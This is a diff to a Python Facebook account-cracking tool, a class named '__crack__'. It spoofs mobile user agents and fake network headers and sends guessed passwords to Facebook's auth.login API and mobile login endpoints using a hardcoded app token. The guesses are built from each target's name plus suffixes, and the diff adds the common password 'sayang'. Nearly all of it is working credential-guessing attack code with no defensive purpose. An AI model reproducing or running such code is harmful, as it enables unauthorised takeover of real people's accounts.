@@ -881,7 +881,40 @@ class __crack__:
 	'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
 	'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1',
 	'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/603.1.23 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1',
-	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12'])
+	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12',
+	'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+	'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+	'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+	'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+	'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
+	'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
+	'Mozilla/5.0 (Linux; Android 8.0; SAMSUNG SM-G935F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36',
+	'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
+	'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
+	'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
+	'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
+	'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
+	'Mozilla/5.0 (Linux; Android 7.1; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
+	'Mozilla/5.0 (Linux; Android 7.1; Xiaomi M2012K11AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
+	'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36',
+	'Mozilla/5.0 (Linux; Android 9; OPPO CPH2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36',
+	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
+	'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F/DSN Build/U4EUC8) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/91.0.4472.77 Mobile Safari/537.36',
+	'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36',
+	'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36',
+	'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/90.0.4430.216 Mobile/15E148 Safari/604.1',
+	'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36',
+	'Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36',
+	'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F',
+	'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36',
+	'Mozilla/5.0 (Linux; Android 10.0; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36',
+	'Mozilla/5.0 (Linux; Android 10; BASIC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36',
+	'Mozilla/5.0 (Linux; Android 10; Nokia 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 (Ecosia android@88.0.4324.181)',
+	'Mozilla/5.0 (Series40; NokiaC2-06/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.33',
+	'Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36',
+	'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 929) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537',
+	'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9',
+	'Opera/9.80 (Windows Phone; Opera Mini/8.1.0/37.6334; U; en) Presto/2.12.423 Version/12.16', 'Mozilla/5.0 (Mobile; ALCATELOneTouch4019A; rv:28.0) Gecko/28.0 Firefox/28.0'])
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': user_agent1,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
             params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
             api = 'https://b-api.facebook.com/method/auth.login'
@@ -1006,33 +1039,33 @@ class __crack__:
                         xz = bb[1].split(' ')
                         if len(xz) == 1:
                             	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345',
+                        		xz[0], xz[0]+'123', xz[0]+'12345', 'sayang',
                         	]
                         elif len(xz) == 2:
                         	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345',
-                        		xz[1], xz[1]+'123', xz[1]+'12345',
+                        		xz[0], xz[0]+'123', xz[0]+'12345', 'sayang',
+                        		xz[1], xz[1]+'123', xz[1]+'12345', 'sayang',
                         	]
                         elif len(xz) == 3:
                         	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345',
-                        		xz[1], xz[1]+'123', xz[1]+'12345', 
-                        		xz[2], xz[2]+'123', xz[2]+'12345',
+                        		xz[0], xz[0]+'123', xz[0]+'12345', 'sayang',
+                        		xz[1], xz[1]+'123', xz[1]+'12345', 'sayang',
+                        		xz[2], xz[2]+'123', xz[2]+'12345', 'sayang',
                         	]
                         elif len(xz) == 4:
                         	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345',
-                        		xz[1], xz[1]+'123', xz[1]+'12345',
-                        		xz[2], xz[2]+'123', xz[2]+'12345',
-                        		xz[3], xz[3]+'123', xz[3]+'12345',
+                        		xz[0], xz[0]+'123', xz[0]+'12345', 'sayang',
+                        		xz[1], xz[1]+'123', xz[1]+'12345', 'sayang',
+                        		xz[2], xz[2]+'123', xz[2]+'12345', 'sayang',
+                        		xz[3], xz[3]+'123', xz[3]+'12345', 'sayang',
                         	]
                         elif len(xz) == 5:
                         	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345',
-                        		xz[1], xz[1]+'123', xz[1]+'12345',
-                        		xz[2], xz[2]+'123', xz[2]+'12345', 
-                        		xz[3], xz[3]+'123', xz[3]+'12345',
-                        		xz[4], xz[4]+'123', xz[4]+'12345',
+                        		xz[0], xz[0]+'123', xz[0]+'12345', 'sayang',
+                        		xz[1], xz[1]+'123', xz[1]+'12345', 'sayang',
+                        		xz[2], xz[2]+'123', xz[2]+'12345',  'sayang',
+                        		xz[3], xz[3]+'123', xz[3]+'12345', 'sayang',
+                        		xz[4], xz[4]+'123', xz[4]+'12345', 'sayang',
                         	]
                         __yayanXD__.submit(self.__api__, bb[0], raimuuu)
                     except:
@@ -1060,28 +1093,28 @@ class __crack__:
                         	]
                         elif len(xz) == 2:
                         	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345', 
+                        		xz[0], xz[0]+'123', xz[0]+'12345',
                         		xz[1], xz[1]+'123', xz[1]+'12345',
                         	]
                         elif len(xz) == 3:
                         	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345', 
-                        		xz[1], xz[1]+'123', xz[1]+'12345', 
+                        		xz[0], xz[0]+'123', xz[0]+'12345',
+                        		xz[1], xz[1]+'123', xz[1]+'12345',
                         		xz[2], xz[2]+'123', xz[2]+'12345',
                         	]
                         elif len(xz) == 4:
                         	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345', 
-                        		xz[1], xz[1]+'123', xz[1]+'12345', 
-                        		xz[2], xz[2]+'123', xz[2]+'12345', 
+                        		xz[0], xz[0]+'123', xz[0]+'12345',
+                        		xz[1], xz[1]+'123', xz[1]+'12345',
+                        		xz[2], xz[2]+'123', xz[2]+'12345',
                         		xz[3], xz[3]+'123', xz[3]+'12345',
                         	]
                         elif len(xz) == 5:
                         	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345', 
-                        		xz[1], xz[1]+'123', xz[1]+'12345', 
-                        		xz[2], xz[2]+'123', xz[2]+'12345', 
-                        		xz[3], xz[3]+'123', xz[3]+'12345', 
+                        		xz[0], xz[0]+'123', xz[0]+'12345',
+                        		xz[1], xz[1]+'123', xz[1]+'12345',
+                        		xz[2], xz[2]+'123', xz[2]+'12345',
+                        		xz[3], xz[3]+'123', xz[3]+'12345',
                         		xz[4], xz[4]+'123', xz[4]+'12345',
                         	]
                         __yayanXD__.submit(self.__mbasic__, bb[0], raimuuu)
@@ -1110,28 +1143,28 @@ class __crack__:
                         	]
                         elif len(xz) == 2:
                         	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345', 
+                        		xz[0], xz[0]+'123', xz[0]+'12345',
                         		xz[1], xz[1]+'123', xz[1]+'12345',
                         	]
                         elif len(xz) == 3:
                         	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345', 
-                        		xz[1], xz[1]+'123', xz[1]+'12345', 
+                        		xz[0], xz[0]+'123', xz[0]+'12345',
+                        		xz[1], xz[1]+'123', xz[1]+'12345',
                         		xz[2], xz[2]+'123', xz[2]+'12345',
                         	]
                         elif len(xz) == 4:
                         	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345', 
-                        		xz[1], xz[1]+'123', xz[1]+'12345', 
-                        		xz[2], xz[2]+'123', xz[2]+'12345', 
+                        		xz[0], xz[0]+'123', xz[0]+'12345',
+                        		xz[1], xz[1]+'123', xz[1]+'12345',
+                        		xz[2], xz[2]+'123', xz[2]+'12345',
                         		xz[3], xz[3]+'123', xz[3]+'12345',
                         	]
                         elif len(xz) == 5:
                         	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345', 
-                        		xz[1], xz[1]+'123', xz[1]+'12345', 
-                        		xz[2], xz[2]+'123', xz[2]+'12345', 
-                        		xz[3], xz[3]+'123', xz[3]+'12345', 
+                        		xz[0], xz[0]+'123', xz[0]+'12345',
+                        		xz[1], xz[1]+'123', xz[1]+'12345',
+                        		xz[2], xz[2]+'123', xz[2]+'12345',
+                        		xz[3], xz[3]+'123', xz[3]+'12345',
                         		xz[4], xz[4]+'123', xz[4]+'12345',
                         	]
                         __yayanXD__.submit(self.__mfb__, bb[0], raimuuu)
